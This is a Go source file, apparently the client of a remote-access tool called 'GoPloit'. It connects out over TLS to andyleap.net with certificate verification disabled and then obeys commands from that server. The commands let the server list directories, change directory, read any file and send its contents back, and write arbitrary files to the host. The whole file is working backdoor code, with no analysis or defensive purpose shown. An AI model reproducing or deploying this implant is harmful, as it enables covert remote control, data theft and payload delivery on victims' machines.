// GoPloit project main.go
package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path"

	"github.com/gosploit/protocol"
)

var (
	Send *json.Encoder
	Recv *json.Decoder
)

func main() {
	cfg := &tls.Config{
		InsecureSkipVerify: true,
	}
	tlsConn, err := tls.Dial("tcp", "andyleap.net:443", cfg)
	if err != nil {
		fmt.Println(err)
		return
	}
	err = tlsConn.Handshake()
	if err != nil {
		fmt.Println(err)
		return
	}
	Send = json.NewEncoder(tlsConn)
	Recv = json.NewDecoder(tlsConn)
	for {
		var p *protocol.Packet
		if err := Recv.Decode(&p); err != nil {
			fmt.Println(err)
			return
		}
		Execute(p)
	}
}

func Execute(p *protocol.Packet) {
	resp := &protocol.Packet{}
	resp.ID = p.ID
	switch msg := p.Msg.(type) {
	case protocol.ChDirCommand:
		os.Chdir(msg.NewDir)
		resp.Msg = protocol.ChDirResponse{}
		Send.Encode(resp)
	case protocol.ListCommand:
		wd, _ := os.Getwd()
		rawfiles, _ := ioutil.ReadDir(wd)
		files := make([]protocol.File, 0, len(rawfiles))
		for _, rawfile := range rawfiles {
			files = append(files, protocol.File{
				Name:  rawfile.Name(),
				IsDir: rawfile.IsDir(),
				Size:  rawfile.Size(),
			})
		}
		resp.Msg = protocol.ListResponse{
			Files: files,
		}
		Send.Encode(resp)
	case protocol.GetCommand:
		file := msg.File
		if !path.IsAbs(file) {
			file = path.Join(file)
		}
		buf, _ := ioutil.ReadFile(file)
		resp.Msg = protocol.GetResponse{
			Data: buf,
		}
		Send.Encode(resp)
	case protocol.PutCommand:
		file := msg.File
		if !path.IsAbs(file) {
			file = path.Join(file)
		}
		ioutil.WriteFile(file, msg.Data, 0666)
		resp.Msg = protocol.PutResponse{}
		Send.Encode(resp)
	}
}
